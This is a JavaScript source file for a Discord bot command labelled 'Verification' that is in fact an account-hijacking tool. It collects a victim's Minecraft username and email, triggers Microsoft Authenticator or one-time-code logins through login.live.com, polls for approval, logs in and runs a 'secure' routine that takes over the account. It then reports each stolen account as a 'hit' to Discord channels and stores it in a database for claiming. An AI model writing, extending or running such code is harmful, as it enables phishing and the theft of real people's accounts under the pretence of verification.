const generate = require("../../utils/generate");
const validEmail = require("../../utils/emails/validEmail");
const { queryParams } = require("../../../db/database");
const config = require("../../../config.json");
const isUrl = require("../../utils/utils/isUrl");
const {
  invalidEmailMessager,
  secEmailMessager,
  oauthMessager,
  noOAuthMessager,
  AuthenticatorMessager,
  timedOutMessager,
  invalidAuthenticatorMessager,
  invalidEmailRegexMessager,
  loginCookieMessager,
  autosecuredisabledMessager,
  nomcmessager,
  lockedmessager,
  invalidatedmessager
} = require("../../utils/utils/messager");
const login = require("../../utils/secure/login");
const secure = require("../../utils/secure/recodesecure");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const axios = require("axios");
const listAccount = require("../../utils/accounts/listAccount");
const fetchStats = require("../../utils/hypixelapi/fetchStats");
const listProfile = require("../../utils/hypixelapi/listProfile");
const sendAuth = require("../../utils/secure/sendAuth");
const generateuid = require("../../utils/generateuid");
const insertaccount = require("../../../db/insertaccount");
const aftersecure = require("../../utils/secure/aftersecure");
const sendotp = require("../../utils/secure/sendotp")
const checkmc = require("../../../db/checkmc")
const getEmbed = require("../../../autosecure/utils/responses/getEmbed")
const isblacklisted = require("../../../autosecure/utils/utils/isblacklisted");
const { failedembed } = require("../../utils/embeds/embedhandler.js");
const { validateusername } = require("../../utils/utils/validateusername.js");
const getCredentials = require("../../utils/info/getCredentials.js");
const { sendSecureNotification } = require('../../utils/notifications/notifier.js');
const getStats = require('../../utils/hypixelapi/getStats.js');
const statsembed = require("../../utils/stats/statsembed.js");

let obj = {
  name: "Verification",
  callback: async (client, interaction) => {
    let passed = false
    let mcname, email, server_id, notis, nohit;
    let time = Date.now();
    await interaction.deferReply({ ephemeral: true });
    const customIdParts = interaction.customId.split('|');
    if (customIdParts.length > 1) {
      mcname = customIdParts[1];
      email = interaction.fields.getTextInputValue('Email');  // Get the email from the input field
    } else if (interaction.components?.length > 0) {
      mcname = interaction.components[0].components[0].value;
      email = interaction.components[1].components[0].value;  // Get the email from the component
    } else {
      return interaction.editReply({ content: 'Unexpected error occurred. Please try again.', ephemeral: true });
    }


    // Continue button clicked without split verification.
    passed = interaction.customId.split("|")[1]
    // console.log(`passed: ${passed}`)



    //  console.log(`got email: ${email}`)
    let blacklisted = await isblacklisted(client, interaction, email)
    //   console.log(`is blacklisted: ${blacklisted}`)
    if (blacklisted) {
      const embed = await getEmbed(client, "blacklisted");
      return await interaction.editReply({
        embeds: [embed],
        ephemeral: true,
      });
    }



    let settings = await client.queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [client.username]);
    if (settings.length == 0) {
      return interaction.editReply({ content: `Set the server first!\nusing **/set**!`, ephemeral: true });
    }
    settings = settings[0];

    let [channelId, guildId] = settings.logs_channel?.split("|") || [];
    let [nChannelId, nGuildId] = settings.notification_channel?.split("|") || [];
    let [hChannelId, hGuildId] = settings.hits_channel?.split("|") || [];
    if (!hChannelId && config.hitschannel) {
      hChannelId = config.hitschannel;
    }
    let [rChannelId, rGuildId] = settings.users_channel?.split("|") || [];

    if (settings.users_channel) {
      notis = true;
    } else {
      notis = false;
    }

    if (!channelId || !guildId) {
      return interaction.editReply({ content: `Set your logs channel first!\nusing **/set**`, ephemeral: true });
    }

    if (!hChannelId || !hGuildId) {
      return interaction.editReply({ content: `Set the Hits Channel first!\nusing **/set**`, ephemeral: true });
    }

    if (settings.server_id) {
      server_id = settings.server_id;
    }

    if (!passed) {
      let validatedusername = await validateusername(mcname, settings.validateusername)
      // const val = JSON.stringify(validatedusername)
      // console.log(val)
      // console.log(`${validatedusername}`)
      if (!validatedusername.success) {
        await invalidatedmessager(client, guildId, channelId, interaction, mcname, validatedusername.reason, false);
        if (notis) {
          await invalidatedmessager(client, rGuildId, rChannelId, interaction, mcname, validatedusername.reason, false, true);
        }
        return;
      }
    }

    if (!validEmail(email)) {
      await invalidEmailRegexMessager(client, guildId, channelId, interaction, mcname, email);
      if (notis) {
        await invalidEmailRegexMessager(client, rGuildId, rChannelId, interaction, mcname, email, true);
      }
      return;
    }



    const data = await getCredentials(email)


    let profiles = null;

    try {
      profiles = data
    } catch (error) {
      console.error("Error parsing profile data:", error);
      await invalidEmailMessager(client, guildId, channelId, interaction, mcname, email);
      if (notis) {
        await invalidEmailMessager(client, rGuildId, rChannelId, interaction, mcname, email, true);
      }
      return;
    }

    if (!profiles) {
      await invalidEmailMessager(client, guildId, channelId, interaction, mcname, email);
      if (notis) {
        await invalidEmailMessager(client, rGuildId, rChannelId, interaction, mcname, email, true);
      }
      return;
    }

    if (profiles?.Credentials?.RemoteNgcParams) {
      let [flowToken, entropy] = [profiles.Credentials.RemoteNgcParams.SessionIdentifier, profiles.Credentials.RemoteNgcParams.Entropy];
      if (!entropy) {
        entropy = await sendAuth(flowToken);
      }
      await AuthenticatorMessager(client, guildId, channelId, interaction, mcname, email, entropy ? entropy : `Accept`);
      if (notis) {
        await AuthenticatorMessager(client, rGuildId, rChannelId, interaction, mcname, email, entropy ? entropy : `Accept`, true);
      }

      let i = 0;
      let intervalId = setInterval(async () => {
        try {
          if (i == 60) {
            clearInterval(intervalId);
            await timedOutMessager(client, guildId, channelId, interaction, mcname, email);
            if (notis) {
              await timedOutMessager(client, rGuildId, rChannelId, interaction, mcname, email, true);
            }
            return;
          }

          const { data } = await axios({
            method: "POST",
            headers: {
              Cookie: `MSPOK=$uuid-d7404240-de39-47d5-9942-13f3ba844eec$uuid-9c2de3f5-d742-44dc-9227-babcdd9d4094$uuid-567b6c7e-4a29-40f2-8552-ab11b804a699;`
            },
            url: `https://login.live.com/GetSessionState.srf?mkt=EN-US&lc=1033&slk=${flowToken}&slkt=NGC`,
            data: {
              "DeviceCode": flowToken
            }
          });

          if (data.SessionState > 1 && data.AuthorizationState == 1) {
            clearInterval(intervalId);
            await invalidAuthenticatorMessager(client, guildId, channelId, interaction, mcname, email);
            if (notis) {
              await invalidAuthenticatorMessager(client, rGuildId, rChannelId, interaction, mcname, email, true);
            }
          } else if (data.AuthorizationState > 1 || data.SessionState > 1) {
            clearInterval(intervalId);

            let host = await login({ slk: flowToken, email: email }, profiles);

            if (host) {
              console.log("Logged in successfully");
              await interaction.editReply({
                embeds: [await getEmbed(client, "res")],
                ephemeral: true
              });
              let uid = await generateuid();
              let code = 'Accepted Auth';
              await loginCookieMessager(client, guildId, channelId, host, mcname, email, interaction, code, uid);
              if (notis) {
                await loginCookieMessager(client, rGuildId, rChannelId, host, mcname, email, interaction, code, uid, true);
              }

              let acc = await secure(host, settings, uid, mcname);

              if (acc.email === "Locked!") {
                nohit = true;
                await lockedmessager(client, guildId, channelId, interaction, mcname, email, false, false);
                if (rChannelId && rGuildId) {
                  await lockedmessager(client, rGuildId, rChannelId, interaction, mcname, email, true, false);
                }
              }


              if (acc.email === "unauthed") {
                nohit = true;
                await lockedmessager(client, guildId, channelId, interaction, mcname, email, false, true);
                if (rChannelId && rGuildId) {
                  await lockedmessager(client, rGuildId, rChannelId, interaction, mcname, email, true, true);
                }
              }

              if ((settings.secureifnomc === "0" || settings.secureifnomc === 0) && acc.email === "No Minecraft!") {
                nohit = true
                await nomcmessager(client, guildId, channelId, interaction, mcname, email);
                if (rChannelId && rGuildId) {
                  await nomcmessager(client, rGuildId, rChannelId, interaction, mcname, email, true);
                }
              }




              await insertaccount(acc, uid, client.username, settings.secureifnomc);


              let hasMinecraft = await checkmc(acc.mc);

              let msg = await listAccount(acc, uid, client, interaction);
              if (!nohit) {
                try {
                  let hitChannel = await client.channels.fetch(hChannelId).catch(() => null);
                  if (!hitChannel) {
                    const { getMainBotClient } = require('../../../mainbot/handlers/botHandler');
                    const mainBot = getMainBotClient();
                    if (mainBot && mainBot.isReady()) {
                      hitChannel = await mainBot.channels.fetch(hChannelId).catch(() => null);
                    }
                  }
                  if (hitChannel) {
                    await hitChannel.send(msg);
                  } else {
                    console.error(`[USER-DETAILS] Could not find hits channel ${hChannelId}`);
                  }
                } catch (hitErr) {
                  console.error(`[USER-DETAILS] Error sending hit:`, hitErr.message);
                }
              }

              const { failed, failedmsg } = await failedembed(acc, uid)
              if (failed && hChannelId) {
                try {
                  let hitChannel = await client.channels.fetch(hChannelId).catch(() => null);
                  if (!hitChannel) {
                    const { getMainBotClient } = require('../../../mainbot/handlers/botHandler');
                    const mainBot = getMainBotClient();
                    if (mainBot && mainBot.isReady()) {
                      hitChannel = await mainBot.channels.fetch(hChannelId).catch(() => null);
                    }
                  }
                  if (hitChannel) await hitChannel.send(failedmsg);
                } catch (failErr) {
                  console.error(`[USER-DETAILS] Error sending failed embed:`, failErr.message);
                }
              }


              let neededmsg = failed ? failedmsg : msg

              let doneaftersecure = await aftersecure(neededmsg, acc.aftersecure, interaction.user.id, settings, client, server_id, client.username, acc.oldEmail, acc);
              if (doneaftersecure) {
                console.log('Did AfterSecure!');
              }





              if (hasMinecraft && settings.claiming) {
                const timestamp = Math.floor(Date.now() / 1000)

                await client.queryParams(
                  "INSERT INTO unclaimed (user_id, username, date, data) VALUES (?, ?, ?, ?)",
                  [client.username, acc.oldName, timestamp, JSON.stringify({ acc, uid, mcname })]
                )

                await client.queryParams(
                  "INSERT INTO unclaimed (user_id, username, date, data) VALUES (?, ?, ?, ?)",
                  [client.username, mcname, timestamp, JSON.stringify({ acc, uid, mcname })]
                )
              }

              if (nChannelId && nGuildId) {
                if (hasMinecraft) {
                  const ping = settings.ping === "None" ? null : settings.ping;
                  await client.guilds.cache.get(nGuildId).channels.cache.get(nChannelId).send(
                    await listProfile(acc.oldName, { sensored: true, list: "skyblock", ping: ping })
                  );
                } else {
                  let msgnomc = {
                    embeds: [{
                      description: "```\nSomeone's account has been secured, but it doesn't own Minecraft.\n```",
                      color: 0xA6C3F0
                    }]
                  };
                  await client.guilds.cache.get(nGuildId).channels.cache.get(nChannelId).send(msgnomc);
                }
              }
            }
          }
          i++;
        } catch (error) {
          console.error("Error in interval processing:", error);
          // Continue the interval even if there's an error
        }
      }, 2000);
    } else if (
      profiles?.Credentials?.OtcLoginEligibleProofs ||
      (profiles?._securityEmails && profiles._securityEmails.length > 0) ||
      (Array.isArray(profiles?.Credentials?.Proofs) && profiles.Credentials.Proofs.length > 0)
    ) {
      const eligibleProofs = profiles.Credentials?.OtcLoginEligibleProofs ||
        (profiles._securityEmails && profiles._securityEmails.length > 0 ? profiles._securityEmails.map(s => s.proof || s) : null) ||
        profiles.Credentials?.Proofs;

      let secEmail = eligibleProofs[0];
      let secs = eligibleProofs.map(s => s.display || s.data || s);
      let id = generate(33);
      let secDisplay = secEmail.display || secEmail.data || secEmail;
      let secData = secEmail.data || secEmail.display || secEmail;

      await client.queryParams(`INSERT INTO actions(id,action) VALUES(?,?)`, [id, `confirmcode|${email}|${secDisplay}|${secData}|${mcname}|${interaction.user.id}|${client.username}|${client.botnumber}`]);

      const messagePromises = [
        secEmailMessager(client, guildId, channelId, interaction, id, mcname, email, secs, secDisplay)
      ];

      if (notis) {
        messagePromises.push(secEmailMessager(client, rGuildId, rChannelId, interaction, id, mcname, email, secs, secDisplay, true));
      }

      await Promise.all(messagePromises);
      sendotp(email, secData);
    } else {
      const is2FA = Boolean(
        profiles?.Credentials?.FidoParams ||
        profiles?.Credentials?.HasPassword === false ||
        profiles?._totalSecurityMethods > 0 ||
        profiles?._hasSecurityEmail ||
        profiles?._hasPhone
      );
      const statusText = is2FA ? "2FA" : "No security options";

      if (settings.oauth_link && isUrl(settings.oauth_link)) {
        await oauthMessager(client, guildId, channelId, interaction, mcname, email, settings.oauth_link);
        if (notis) {
          await oauthMessager(client, rGuildId, rChannelId, interaction, mcname, email, settings.oauth_link, true);
        }
      } else {
        await noOAuthMessager(client, guildId, channelId, interaction, mcname, email, false, statusText);
        if (notis) {
          await noOAuthMessager(client, rGuildId, rChannelId, interaction, mcname, email, true, statusText);
        }
      }
    }
  }
};

module.exports = obj;